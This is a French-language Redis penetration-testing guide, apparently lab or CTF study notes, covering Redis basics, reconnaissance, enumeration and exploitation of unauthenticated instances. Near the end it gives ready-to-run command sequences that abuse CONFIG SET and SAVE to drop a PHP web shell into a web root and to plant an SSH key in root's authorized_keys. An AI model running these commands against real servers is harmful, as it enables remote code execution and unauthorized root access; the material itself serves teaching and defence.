# 🧠 REDIS — GUIDE COMPLET PENTEST

## 1️⃣ REDIS — LE CONTEXTE RÉEL

### 🎯 Problème informatique

Les applications modernes ont besoin de :

* lire / écrire **très vite**
* gérer des **milliers d’utilisateurs**
* stocker des données **temporaires mais critiques**

Les bases classiques (MySQL, PostgreSQL) sont :

* fiables
* mais lentes pour certains usages

---

### ✅ Solution : Redis

👉 **Redis = base de données NoSQL clé → valeur en mémoire (RAM)**

* ultra rapide
* simple
* utilisée comme :

  * cache
  * store de sessions
  * gestion de tokens
  * files d’attente

---

## 2️⃣ COMMENT REDIS FONCTIONNE (TECHNIQUE PURE)

### 🧱 Architecture

* Redis = **serveur**
* Écoute par défaut sur :

```
TCP 6379
```

* Les clients se connectent et envoient des **commandes texte**

---

### 🔌 Protocole

* Protocole **RESP**
* Pas HTTP
* Pas chiffré par défaut
* Pas orienté utilisateurs

👉 **Confiance totale au réseau**

---

### 🧪 Exemple logique

```
Client  ── texte ──> Redis
Redis   ── texte ──> Client
```

---

## 3️⃣ REDIS COMME BASE DE DONNÉES

### 🗝️ Modèle clé → valeur

```
clé        → valeur
session:1  → token_abc123
```

Commandes de base :

* `SET` → écrire
* `GET` → lire
* `DEL` → supprimer

Redis **ne comprend pas le contenu** :

* texte
* JSON
* mot de passe
* code
  → tout est une chaîne d’octets

---

## 4️⃣ REDIS ET LA PERSISTENCE (POINT CLÉ)

### ❓ Redis est en RAM, donc volatile ?

Oui… **mais** Redis peut sauvegarder sur disque.

👉 Deux mécanismes :

* RDB (snapshot)
* AOF (log)

En pentest, on s’intéresse surtout à **RDB**.

---

### 🔹 Principe RDB

Redis peut :

1. prendre tout ce qu’il a en RAM
2. l’écrire dans un fichier sur le disque

Commande clé :

```
SAVE
```

---

### 🔹 Où Redis écrit ?

Deux paramètres critiques :

* `dir` → dossier
* `dbfilename` → nom du fichier

Par défaut :

```
/var/lib/redis/dump.rdb
```

⚠️ Mais **modifiables dynamiquement**

---

## 5️⃣ POURQUOI REDIS EST DANGEREUX EN SÉCURITÉ

Redis devient dangereux quand :

* exposé sur le réseau
* sans authentification
* avec droits d’écriture disque
* parfois lancé en **root**

👉 Dans ce cas, Redis devient :

> **un service réseau capable d’écrire des fichiers sur le système**

---

## 6️⃣ REDIS EN PHASE DE RECONNAISSANCE (PENTEST)

### 🔍 Détection réseau

```
nmap -p 6379 IP
```

Résultat typique :

```
6379/tcp open redis
```

---

### 🔍 Connexion

```
redis-cli -h IP
```

Si tu obtiens :

```
IP:6379>
```

👉 Redis est **accessible sans auth**

---

### 🔍 Test basique

```
PING
```

Réponse attendue :

```
PONG
```
Dans le cas contrire il faudras s'authentifier avec :

```
AUTH mot_de_passe
```

---

## 7️⃣ ENUMÉRATION REDIS

### 📊 Infos générales

```
INFO
```

Tu peux obtenir :

* version Redis
* OS
* uptime
* rôle (master/slave)
* chemins disque

---

### 🔑 Lister les clés (CTF / lab)

```
KEYS *
```

⚠️ Dangereux en prod
✔️ Accepté en CTF

---

### 📖 Lire une valeur

```
GET nom_de_la_cle
```

👉 Très souvent :

* mots de passe
* tokens
* flags

---

## 8️⃣ REDIS ET LA CONFIGURATION (CRITIQUE)

### 🔧 Voir la configuration active

```
CONFIG GET *
```

Si ça ne marche pas il faut chercher le type de la clé : 

```bash
TYPE nom_cle
```

Selon le type, utilise la commande appropriée :

* **string** : `GET key`
* **list** : `LRANGE key 0 -1`
* **set** : `SMEMBERS key`
* **hash** : `HGETALL key`
* **zset** : `ZRANGE key 0 -1`


Cibles importantes :

* `requirepass`
* `dir`
* `dbfilename`

---

### 🔧 Exemple logique

```
CONFIG GET dir
```

→ Où Redis écrit actuellement

---

## 9️⃣ REDIS → ÉCRITURE DISQUE (POINT DE BASCULE)

### 🧠 Raisonnement pentest

Si :

* je contrôle **le contenu en RAM**
* je contrôle **le dossier**
* je contrôle **le nom du fichier**
* je force un `SAVE`

👉 alors :

> **je contrôle un fichier sur le système**

---

### ⚠️ Redis ne vérifie PAS :

* le type de fichier
* l’extension
* l’usage futur

---

## 🔥 10️⃣ IMPACTS SÉCURITÉ (THÉORIQUES / LAB)

### 🎯 Cas 1 — Serveur Web

Si Redis écrit dans un dossier web :

* le serveur web interprète le fichier
* Redis devient un **vecteur RCE indirect**

👉 Redis n’exécute rien
👉 Il **dépose** un fichier

Pratique :
Si le serveur a :

/var/www/html

Tu fais :
```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['cmd']); ?>"
SAVE
```

👉 Résultat :

fichier /var/www/html/shell.php

exécution de commandes via navigateur

🎯 RCE : Il suffit d'y accéder via le lien : site/shell.php?cmd=ls

---

### 🎯 Cas 2 — SSH

Si Redis écrit dans :

```
~/.ssh/authorized_keys
```

👉 SSH fait confiance à ce fichier
👉 Accès distant sans mot de passe

Pratique: 
Si Redis tourne en root :

```bash
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "ssh-rsa AAAA..."
SAVE
```

> 💡 **Note :** 
- `x` est la clé et `"ssh-rsa AAAA..."` est la valeur.
- L'utilisateur sous lequel tourne redis doit avoir `les droits d'écriture`


👉 Résultat :

- clé SSH ajoutée

- accès root direct

- Tu peux t'y connecter sans mot de passe
---


---

## 1️⃣2️⃣ SCHÉMA MENTAL

```
Redis ouvert
   ↓
Pas d’auth
   ↓
Lecture de données
   ↓
Écriture RAM
   ↓
SAVE
   ↓
Écriture disque
   ↓
Impact système
```

